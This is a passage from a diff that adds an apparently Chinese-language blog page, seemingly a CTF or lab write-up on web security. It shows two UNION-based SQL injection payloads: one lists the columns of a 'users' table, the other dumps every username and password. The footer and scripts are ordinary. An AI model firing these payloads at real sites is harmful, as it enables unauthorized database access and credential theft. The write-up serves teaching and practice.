+<li><p>查询列名 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union <span class="keyword">SELECT</span> <span class="number">1</span>, <span class="number">2</span>, group_concat(column_name) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_schema = <span class="string">&#x27;security&#x27;</span> <span class="keyword">AND</span> table_name = <span class="string">&#x27;users&#x27;</span>; --+</span><br></pre></td></tr></table></figure> <img
+src="https://gcore.jsdelivr.net/gh/CC-Ming/picture/imgs/20250822222315.png"
+alt="20250822222315" /></p></li>
+<li><p>查询所有用户名和密码 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1&#x27; union SELECT 1, group_concat(username), group_concat(password) <span class="keyword">FROM</span><span class="built_in"> users </span>--+</span><br></pre></td></tr></table></figure> <img
+src="https://gcore.jsdelivr.net/gh/CC-Ming/picture/imgs/20250822222626.png"
+alt="20250822222626" /></p></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/02/11/CTF/%E6%A0%88%E6%BA%A2%E5%87%BA3/" rel="prev" title="链接与重定位">
+                  <i class="fa fa-angle-left"></i> 链接与重定位
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">CMing-迟明</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
